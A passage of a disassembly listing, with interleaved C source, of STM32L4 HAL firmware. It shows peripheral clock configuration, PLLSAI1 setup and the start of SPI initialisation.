    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 8004842:	4b31      	ldr	r3, [pc, #196]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004844:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004848:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 800484c:	687b      	ldr	r3, [r7, #4]
 800484e:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004850:	492d      	ldr	r1, [pc, #180]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004852:	4313      	orrs	r3, r2
 8004854:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 8004858:	687b      	ldr	r3, [r7, #4]
 800485a:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 800485c:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004860:	d106      	bne.n	8004870 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004862:	4b29      	ldr	r3, [pc, #164]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004864:	68db      	ldr	r3, [r3, #12]
 8004866:	4a28      	ldr	r2, [pc, #160]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004868:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 800486c:	60d3      	str	r3, [r2, #12]
 800486e:	e011      	b.n	8004894 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 8004870:	687b      	ldr	r3, [r7, #4]
 8004872:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004874:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004878:	d10c      	bne.n	8004894 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 800487a:	687b      	ldr	r3, [r7, #4]
 800487c:	3304      	adds	r3, #4
 800487e:	2101      	movs	r1, #1
 8004880:	4618      	mov	r0, r3
 8004882:	f000 f853 	bl	800492c <RCCEx_PLLSAI1_Config>
 8004886:	4603      	mov	r3, r0
 8004888:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 800488a:	7cfb      	ldrb	r3, [r7, #19]
 800488c:	2b00      	cmp	r3, #0
 800488e:	d001      	beq.n	8004894 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 8004890:	7cfb      	ldrb	r3, [r7, #19]
 8004892:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 8004894:	687b      	ldr	r3, [r7, #4]
 8004896:	681b      	ldr	r3, [r3, #0]
 8004898:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800489c:	2b00      	cmp	r3, #0
 800489e:	d01c      	beq.n	80048da <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 80048a0:	4b19      	ldr	r3, [pc, #100]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048a2:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048a6:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 80048aa:	687b      	ldr	r3, [r7, #4]
 80048ac:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 80048ae:	4916      	ldr	r1, [pc, #88]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048b0:	4313      	orrs	r3, r2
 80048b2:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 80048b6:	687b      	ldr	r3, [r7, #4]
 80048b8:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 80048ba:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 80048be:	d10c      	bne.n	80048da <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 80048c0:	687b      	ldr	r3, [r7, #4]
 80048c2:	3304      	adds	r3, #4
 80048c4:	2102      	movs	r1, #2
 80048c6:	4618      	mov	r0, r3
 80048c8:	f000 f830 	bl	800492c <RCCEx_PLLSAI1_Config>
 80048cc:	4603      	mov	r3, r0
 80048ce:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 80048d0:	7cfb      	ldrb	r3, [r7, #19]
 80048d2:	2b00      	cmp	r3, #0
 80048d4:	d001      	beq.n	80048da <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 80048d6:	7cfb      	ldrb	r3, [r7, #19]
 80048d8:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 80048da:	687b      	ldr	r3, [r7, #4]
 80048dc:	681b      	ldr	r3, [r3, #0]
 80048de:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 80048e2:	2b00      	cmp	r3, #0
 80048e4:	d00a      	beq.n	80048fc <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 80048e6:	4b08      	ldr	r3, [pc, #32]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048e8:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048ec:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 80048f0:	687b      	ldr	r3, [r7, #4]
 80048f2:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80048f4:	4904      	ldr	r1, [pc, #16]	; (8004908 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048f6:	4313      	orrs	r3, r2
 80048f8:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 80048fc:	7cbb      	ldrb	r3, [r7, #18]
}
 80048fe:	4618      	mov	r0, r3
 8004900:	3718      	adds	r7, #24
 8004902:	46bd      	mov	sp, r7
 8004904:	bd80      	pop	{r7, pc}
 8004906:	bf00      	nop
 8004908:	40021000 	.word	0x40021000

0800490c <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 800490c:	b480      	push	{r7}
 800490e:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 8004910:	4b05      	ldr	r3, [pc, #20]	; (8004928 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004912:	681b      	ldr	r3, [r3, #0]
 8004914:	4a04      	ldr	r2, [pc, #16]	; (8004928 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004916:	f043 0304 	orr.w	r3, r3, #4
 800491a:	6013      	str	r3, [r2, #0]
}
 800491c:	bf00      	nop
 800491e:	46bd      	mov	sp, r7
 8004920:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004924:	4770      	bx	lr
 8004926:	bf00      	nop
 8004928:	40021000 	.word	0x40021000

0800492c <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 800492c:	b580      	push	{r7, lr}
 800492e:	b084      	sub	sp, #16
 8004930:	af00      	add	r7, sp, #0
 8004932:	6078      	str	r0, [r7, #4]
 8004934:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004936:	2300      	movs	r3, #0
 8004938:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 800493a:	4b74      	ldr	r3, [pc, #464]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 800493c:	68db      	ldr	r3, [r3, #12]
 800493e:	f003 0303 	and.w	r3, r3, #3
 8004942:	2b00      	cmp	r3, #0
 8004944:	d018      	beq.n	8004978 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 8004946:	4b71      	ldr	r3, [pc, #452]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004948:	68db      	ldr	r3, [r3, #12]
 800494a:	f003 0203 	and.w	r2, r3, #3
 800494e:	687b      	ldr	r3, [r7, #4]
 8004950:	681b      	ldr	r3, [r3, #0]
 8004952:	429a      	cmp	r2, r3
 8004954:	d10d      	bne.n	8004972 <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 8004956:	687b      	ldr	r3, [r7, #4]
 8004958:	681b      	ldr	r3, [r3, #0]
       ||
 800495a:	2b00      	cmp	r3, #0
 800495c:	d009      	beq.n	8004972 <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 800495e:	4b6b      	ldr	r3, [pc, #428]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004960:	68db      	ldr	r3, [r3, #12]
 8004962:	091b      	lsrs	r3, r3, #4
 8004964:	f003 0307 	and.w	r3, r3, #7
 8004968:	1c5a      	adds	r2, r3, #1
 800496a:	687b      	ldr	r3, [r7, #4]
 800496c:	685b      	ldr	r3, [r3, #4]
       ||
 800496e:	429a      	cmp	r2, r3
 8004970:	d047      	beq.n	8004a02 <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 8004972:	2301      	movs	r3, #1
 8004974:	73fb      	strb	r3, [r7, #15]
 8004976:	e044      	b.n	8004a02 <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 8004978:	687b      	ldr	r3, [r7, #4]
 800497a:	681b      	ldr	r3, [r3, #0]
 800497c:	2b03      	cmp	r3, #3
 800497e:	d018      	beq.n	80049b2 <RCCEx_PLLSAI1_Config+0x86>
 8004980:	2b03      	cmp	r3, #3
 8004982:	d825      	bhi.n	80049d0 <RCCEx_PLLSAI1_Config+0xa4>
 8004984:	2b01      	cmp	r3, #1
 8004986:	d002      	beq.n	800498e <RCCEx_PLLSAI1_Config+0x62>
 8004988:	2b02      	cmp	r3, #2
 800498a:	d009      	beq.n	80049a0 <RCCEx_PLLSAI1_Config+0x74>
 800498c:	e020      	b.n	80049d0 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 800498e:	4b5f      	ldr	r3, [pc, #380]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004990:	681b      	ldr	r3, [r3, #0]
 8004992:	f003 0302 	and.w	r3, r3, #2
 8004996:	2b00      	cmp	r3, #0
 8004998:	d11d      	bne.n	80049d6 <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 800499a:	2301      	movs	r3, #1
 800499c:	73fb      	strb	r3, [r7, #15]
      }
      break;
 800499e:	e01a      	b.n	80049d6 <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 80049a0:	4b5a      	ldr	r3, [pc, #360]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049a2:	681b      	ldr	r3, [r3, #0]
 80049a4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80049a8:	2b00      	cmp	r3, #0
 80049aa:	d116      	bne.n	80049da <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 80049ac:	2301      	movs	r3, #1
 80049ae:	73fb      	strb	r3, [r7, #15]
      }
      break;
 80049b0:	e013      	b.n	80049da <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 80049b2:	4b56      	ldr	r3, [pc, #344]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049b4:	681b      	ldr	r3, [r3, #0]
 80049b6:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80049ba:	2b00      	cmp	r3, #0
 80049bc:	d10f      	bne.n	80049de <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 80049be:	4b53      	ldr	r3, [pc, #332]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049c0:	681b      	ldr	r3, [r3, #0]
 80049c2:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 80049c6:	2b00      	cmp	r3, #0
 80049c8:	d109      	bne.n	80049de <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 80049ca:	2301      	movs	r3, #1
 80049cc:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 80049ce:	e006      	b.n	80049de <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 80049d0:	2301      	movs	r3, #1
 80049d2:	73fb      	strb	r3, [r7, #15]
      break;
 80049d4:	e004      	b.n	80049e0 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049d6:	bf00      	nop
 80049d8:	e002      	b.n	80049e0 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049da:	bf00      	nop
 80049dc:	e000      	b.n	80049e0 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049de:	bf00      	nop
    }

    if(status == HAL_OK)
 80049e0:	7bfb      	ldrb	r3, [r7, #15]
 80049e2:	2b00      	cmp	r3, #0
 80049e4:	d10d      	bne.n	8004a02 <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 80049e6:	4b49      	ldr	r3, [pc, #292]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049e8:	68db      	ldr	r3, [r3, #12]
 80049ea:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 80049ee:	687b      	ldr	r3, [r7, #4]
 80049f0:	6819      	ldr	r1, [r3, #0]
 80049f2:	687b      	ldr	r3, [r7, #4]
 80049f4:	685b      	ldr	r3, [r3, #4]
 80049f6:	3b01      	subs	r3, #1
 80049f8:	011b      	lsls	r3, r3, #4
 80049fa:	430b      	orrs	r3, r1
 80049fc:	4943      	ldr	r1, [pc, #268]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 80049fe:	4313      	orrs	r3, r2
 8004a00:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 8004a02:	7bfb      	ldrb	r3, [r7, #15]
 8004a04:	2b00      	cmp	r3, #0
 8004a06:	d17c      	bne.n	8004b02 <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004a08:	4b40      	ldr	r3, [pc, #256]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a0a:	681b      	ldr	r3, [r3, #0]
 8004a0c:	4a3f      	ldr	r2, [pc, #252]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a0e:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004a12:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004a14:	f7fc fbc8 	bl	80011a8 <HAL_GetTick>
 8004a18:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a1a:	e009      	b.n	8004a30 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004a1c:	f7fc fbc4 	bl	80011a8 <HAL_GetTick>
 8004a20:	4602      	mov	r2, r0
 8004a22:	68bb      	ldr	r3, [r7, #8]
 8004a24:	1ad3      	subs	r3, r2, r3
 8004a26:	2b02      	cmp	r3, #2
 8004a28:	d902      	bls.n	8004a30 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004a2a:	2303      	movs	r3, #3
 8004a2c:	73fb      	strb	r3, [r7, #15]
        break;
 8004a2e:	e005      	b.n	8004a3c <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a30:	4b36      	ldr	r3, [pc, #216]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a32:	681b      	ldr	r3, [r3, #0]
 8004a34:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004a38:	2b00      	cmp	r3, #0
 8004a3a:	d1ef      	bne.n	8004a1c <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004a3c:	7bfb      	ldrb	r3, [r7, #15]
 8004a3e:	2b00      	cmp	r3, #0
 8004a40:	d15f      	bne.n	8004b02 <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004a42:	683b      	ldr	r3, [r7, #0]
 8004a44:	2b00      	cmp	r3, #0
 8004a46:	d110      	bne.n	8004a6a <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a48:	4b30      	ldr	r3, [pc, #192]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a4a:	691b      	ldr	r3, [r3, #16]
 8004a4c:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004a50:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a54:	687a      	ldr	r2, [r7, #4]
 8004a56:	6892      	ldr	r2, [r2, #8]
 8004a58:	0211      	lsls	r1, r2, #8
 8004a5a:	687a      	ldr	r2, [r7, #4]
 8004a5c:	68d2      	ldr	r2, [r2, #12]
 8004a5e:	06d2      	lsls	r2, r2, #27
 8004a60:	430a      	orrs	r2, r1
 8004a62:	492a      	ldr	r1, [pc, #168]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a64:	4313      	orrs	r3, r2
 8004a66:	610b      	str	r3, [r1, #16]
 8004a68:	e027      	b.n	8004aba <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004a6a:	683b      	ldr	r3, [r7, #0]
 8004a6c:	2b01      	cmp	r3, #1
 8004a6e:	d112      	bne.n	8004a96 <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a70:	4b26      	ldr	r3, [pc, #152]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a72:	691b      	ldr	r3, [r3, #16]
 8004a74:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004a78:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a7c:	687a      	ldr	r2, [r7, #4]
 8004a7e:	6892      	ldr	r2, [r2, #8]
 8004a80:	0211      	lsls	r1, r2, #8
 8004a82:	687a      	ldr	r2, [r7, #4]
 8004a84:	6912      	ldr	r2, [r2, #16]
 8004a86:	0852      	lsrs	r2, r2, #1
 8004a88:	3a01      	subs	r2, #1
 8004a8a:	0552      	lsls	r2, r2, #21
 8004a8c:	430a      	orrs	r2, r1
 8004a8e:	491f      	ldr	r1, [pc, #124]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a90:	4313      	orrs	r3, r2
 8004a92:	610b      	str	r3, [r1, #16]
 8004a94:	e011      	b.n	8004aba <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a96:	4b1d      	ldr	r3, [pc, #116]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a98:	691b      	ldr	r3, [r3, #16]
 8004a9a:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004a9e:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004aa2:	687a      	ldr	r2, [r7, #4]
 8004aa4:	6892      	ldr	r2, [r2, #8]
 8004aa6:	0211      	lsls	r1, r2, #8
 8004aa8:	687a      	ldr	r2, [r7, #4]
 8004aaa:	6952      	ldr	r2, [r2, #20]
 8004aac:	0852      	lsrs	r2, r2, #1
 8004aae:	3a01      	subs	r2, #1
 8004ab0:	0652      	lsls	r2, r2, #25
 8004ab2:	430a      	orrs	r2, r1
 8004ab4:	4915      	ldr	r1, [pc, #84]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ab6:	4313      	orrs	r3, r2
 8004ab8:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004aba:	4b14      	ldr	r3, [pc, #80]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004abc:	681b      	ldr	r3, [r3, #0]
 8004abe:	4a13      	ldr	r2, [pc, #76]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ac0:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004ac4:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004ac6:	f7fc fb6f 	bl	80011a8 <HAL_GetTick>
 8004aca:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004acc:	e009      	b.n	8004ae2 <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004ace:	f7fc fb6b 	bl	80011a8 <HAL_GetTick>
 8004ad2:	4602      	mov	r2, r0
 8004ad4:	68bb      	ldr	r3, [r7, #8]
 8004ad6:	1ad3      	subs	r3, r2, r3
 8004ad8:	2b02      	cmp	r3, #2
 8004ada:	d902      	bls.n	8004ae2 <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004adc:	2303      	movs	r3, #3
 8004ade:	73fb      	strb	r3, [r7, #15]
          break;
 8004ae0:	e005      	b.n	8004aee <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004ae2:	4b0a      	ldr	r3, [pc, #40]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ae4:	681b      	ldr	r3, [r3, #0]
 8004ae6:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004aea:	2b00      	cmp	r3, #0
 8004aec:	d0ef      	beq.n	8004ace <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004aee:	7bfb      	ldrb	r3, [r7, #15]
 8004af0:	2b00      	cmp	r3, #0
 8004af2:	d106      	bne.n	8004b02 <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004af4:	4b05      	ldr	r3, [pc, #20]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004af6:	691a      	ldr	r2, [r3, #16]
 8004af8:	687b      	ldr	r3, [r7, #4]
 8004afa:	699b      	ldr	r3, [r3, #24]
 8004afc:	4903      	ldr	r1, [pc, #12]	; (8004b0c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004afe:	4313      	orrs	r3, r2
 8004b00:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004b02:	7bfb      	ldrb	r3, [r7, #15]
}
 8004b04:	4618      	mov	r0, r3
 8004b06:	3710      	adds	r7, #16
 8004b08:	46bd      	mov	sp, r7
 8004b0a:	bd80      	pop	{r7, pc}
 8004b0c:	40021000 	.word	0x40021000

08004b10 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004b10:	b580      	push	{r7, lr}
 8004b12:	b084      	sub	sp, #16
 8004b14:	af00      	add	r7, sp, #0
 8004b16:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004b18:	687b      	ldr	r3, [r7, #4]
 8004b1a:	2b00      	cmp	r3, #0
 8004b1c:	d101      	bne.n	8004b22 <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004b1e:	2301      	movs	r3, #1
 8004b20:	e095      	b.n	8004c4e <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004b22:	687b      	ldr	r3, [r7, #4]
 8004b24:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004b26:	2b00      	cmp	r3, #0
 8004b28:	d108      	bne.n	8004b3c <HAL_SPI_Init+0x2c>
  {
